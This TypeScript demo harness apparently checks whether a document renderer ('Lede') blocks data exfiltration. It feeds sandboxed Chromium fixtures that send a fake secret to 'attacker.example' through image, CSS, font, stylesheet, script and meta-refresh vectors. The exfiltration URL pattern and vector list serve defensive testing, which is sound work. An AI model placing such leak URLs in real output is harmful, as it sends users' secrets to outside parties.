// Rerunnable exfiltration demo: `node demos/exfil/run.ts`. See README.md. It calls no model: the fixtures are fixed worst-case outputs.
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { fileURLToPath } from 'node:url';
import { chromium, resolveChrome } from '../../bench/src/shot.ts';

export const SECRET = 'sk-demo-NOT-A-REAL-SECRET';
const HOST = 'attacker.example';
const dir = fileURLToPath(new URL('.', import.meta.url));
const cli = fileURLToPath(new URL('../../packages/cli/src/cli.ts', import.meta.url));
const require = createRequire(new URL('../../bench/src/shot.ts', import.meta.url));

export const EXIT_MISMATCH = 1;
export const EXIT_NO_CHROMIUM = 3;

interface Case {
  id: string;
  group: string;
  label: string;
  fixture: string;
  /** `raw` serves the fixture as HTML, `markdown` renders it first, `lede` compiles it with `flags`. */
  kind: 'raw' | 'markdown' | 'lede';
  flags?: string[];
  scheme?: 'http' | 'https';
  click?: boolean;
}

const VECTORS = ['img', 'css-background', 'font', 'link-stylesheet', 'script-fetch', 'meta-refresh'] as const;
const raw = (v: string): Case => ({ id: `raw-html/${v}`, group: 'Raw HTML', label: `HTML: ${v}`, fixture: `html-${v}.html`, kind: 'raw' });
const lede = (id: string, group: string, label: string, fixture: string, flags: string[] = [], extra: Partial<Case> = {}): Case => ({
  id,
  group,
  label,
  fixture,
  kind: 'lede',
  flags,
  ...extra,
});
const html = (v: string) => `lede-html-${v}.lede`;

export const CASES: Case[] = [
  ...VECTORS.map(raw),
  { id: 'markdown/image', group: 'Markdown', label: 'Markdown: ![](url) image', fixture: 'markdown-image.md', kind: 'markdown' },
  lede('lede/image', 'Lede, default flags', 'Lede: image line', 'lede-image.lede'),
  ...VECTORS.map((v) => lede(`lede/html-${v}`, 'Lede, default flags', `Lede: html: block, ${v}`, html(v))),
  lede('lede/link-unclicked', 'Lede, default flags', 'Lede: link, reader does not click', 'lede-link.lede'),
  lede('lede/link-clicked', 'Not blocked', 'Lede: link, reader clicks it', 'lede-link.lede', [], { click: true }),
  lede('lede/allow-remote/image-https', 'Opt-out: --allow-remote', 'Lede --allow-remote: image, https URL', 'lede-image.lede', [
    '--allow-remote',
  ]),
  lede(
    'lede/allow-remote/image-http',
    'Opt-out: --allow-remote',
    'Lede --allow-remote: image, http URL',
    'lede-image.lede',
    ['--allow-remote'],
    {
      scheme: 'http',
    },
  ),
  lede('lede/allow-remote/html-img', 'Opt-out: --allow-remote', 'Lede --allow-remote: html: img', html('img'), ['--allow-remote']),
  ...VECTORS.map((v) => lede(`lede/unsafe-html/${v}`, 'Opt-out: --unsafe-html', `Lede --unsafe-html: ${v}`, html(v), ['--unsafe-html'])),
  lede('lede/artifact/image', 'Opt-out: --artifact', 'Lede --artifact: image line, no host policy', 'lede-image.lede', ['--artifact']),
  lede('lede/artifact/allow-remote/image', 'Opt-out: --artifact', 'Lede --artifact --allow-remote: image', 'lede-image.lede', [
    '--artifact',
    '--allow-remote',
  ]),
  lede('lede/artifact/unsafe-html/script-fetch', 'Opt-out: --artifact', 'Lede --artifact --unsafe-html: script', html('script-fetch'), [
    '--artifact',
    '--unsafe-html',
  ]),
];

export interface Result {
  id: string;
  group: string;
  label: string;
  requests: number;
  leaked: boolean;
}

function page(c: Case): string {
  const url = `${c.scheme ?? 'https'}://${HOST}/leak?q=${SECRET}`;
  const text = readFileSync(`${dir}fixtures/${c.fixture}`, 'utf8').replaceAll('@@LEAK@@', url);
  if (c.kind === 'raw') return `<!doctype html>\n<meta charset="utf-8">\n${text}`;
  if (c.kind === 'markdown') {
    // markdown-it is a bench dependency. Its defaults (html off, images on) are what a typical chat host gives a reply.
    const MarkdownIt = require('markdown-it') as new () => { render(s: string): string };
    return `<!doctype html>\n<meta charset="utf-8">\n${new MarkdownIt().render(text)}`;
  }
  const out = execFileSync(process.execPath, [cli, 'build', '-', ...(c.flags ?? [])], {
    input: text,
    encoding: 'utf8',
    stdio: ['pipe', 'pipe', 'ignore'],
  });
  // A real artifact host wraps the fragment in its own page; here the wrapper is bare, so it adds no policy.
  return c.flags?.includes('--artifact') ? `<!doctype html>\n<meta charset="utf-8">\n${out}` : out;
}

type Browser = Awaited<ReturnType<typeof chromium.launch>>;

async function runCase(browser: Browser, c: Case, url: string): Promise<Result> {
  const ctx = await browser.newContext();
  let requests = 0;
  await ctx.route(
    (u) => u.hostname === HOST,
    (r) => {
      if (r.request().url().includes(SECRET)) requests++;
      return r.fulfill({ status: 200, contentType: 'text/html', body: 'ok' });
    },
  );
  const p = await ctx.newPage();
  await p.goto(url, { waitUntil: 'load' });
  if (c.click) await p.click('a');
  await p.waitForTimeout(500);
  await ctx.close();
  return { id: c.id, group: c.group, label: c.label, requests, leaked: requests > 0 };
}

/** Serves each case's page from 127.0.0.1 over http and opens it in Chromium. The attacker is `attacker.example`, answered by the browser's own routing, so nothing leaves the machine; the resolver rule makes any other host fail to resolve. */
export async function runDemo(exe: string): Promise<Result[]> {
  const pages = new Map<string, string>();
  const server = createServer((req, res) => {
    const body = pages.get(req.url ?? '');
    res.writeHead(body === undefined ? 404 : 200, { 'content-type': 'text/html; charset=utf-8' }).end(body ?? '');
  });
  await new Promise<void>((ok) => server.listen(0, '127.0.0.1', ok));
  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  const browser = await chromium.launch({ executablePath: exe, args: ['--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1'] });
  const results: Result[] = [];
  try {
    for (const [i, c] of CASES.entries()) {
      pages.set(`/${i}`, page(c));
      // oxlint-disable-next-line eslint/no-await-in-loop -- one case at a time keeps the counts per page
      results.push(await runCase(browser, c, `${origin}/${i}`));
    }
  } finally {
    await browser.close();
    server.close();
  }
  return results;
}

export const expected = (): Record<string, boolean> => JSON.parse(readFileSync(`${dir}expected.json`, 'utf8')) as Record<string, boolean>;

export function table(rs: Result[], want: Record<string, boolean>): string {
  const w = Math.max(...rs.map((r) => r.label.length));
  const lines = [`${'Case'.padEnd(w)}  Requests  Leaked  As expected`];
  let group = '';
  for (const r of rs) {
    if (r.group !== group) lines.push(`-- ${(group = r.group)}`);
    lines.push(
      `${r.label.padEnd(w)}  ${String(r.requests).padStart(8)}  ${(r.leaked ? 'yes' : 'no').padEnd(6)}  ${want[r.id] === r.leaked ? 'ok' : 'MISMATCH'}`,
    );
  }
  return lines.join('\n');
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  const exe = resolveChrome();
  if (!exe) {
    console.error(
      'No Chromium found. Set CHROME to a Chromium or Chrome executable, or install one with `npx playwright-core install chromium`.',
    );
    process.exit(EXIT_NO_CHROMIUM);
  }
  const rs = await runDemo(exe);
  const want = expected();
  console.log(table(rs, want));
  const bad = rs.filter((r) => want[r.id] !== r.leaked).length + Object.keys(want).filter((k) => !rs.some((r) => r.id === k)).length;
  console.log(bad ? `\n${bad} result(s) differ from demos/exfil/expected.json` : '\nAll results match demos/exfil/expected.json');
  process.exit(bad ? EXIT_MISMATCH : 0);
}
